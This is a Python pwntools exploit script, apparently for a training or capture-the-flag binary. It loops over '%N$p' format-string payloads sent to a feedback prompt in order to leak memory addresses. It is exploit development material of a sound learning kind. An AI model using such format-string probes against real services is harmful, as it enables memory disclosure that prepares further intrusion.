from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./.build/hello_test', checksec=False)

host = args.HOST or 'localhost'
port = int(args.PORT or 20023)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(["edb", "--run", exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
context.log_level = 'warning'

# Let's fuzz x values
for i in range(100):
    try:
        p = start()
        
        # Exploit format string to leak addresses 
        p.sendlineafter(b'6: Give feedback', b'6')
        p.sendlineafter(b'learned', '%{}$p'.format(i).encode())

        # Receive the response
        p.recvuntil(b': ')
        result = p.recvline()
        print(str(i) + ': ' + str(result, 'utf-8'))

        p.close()
    except EOFError:
        pass
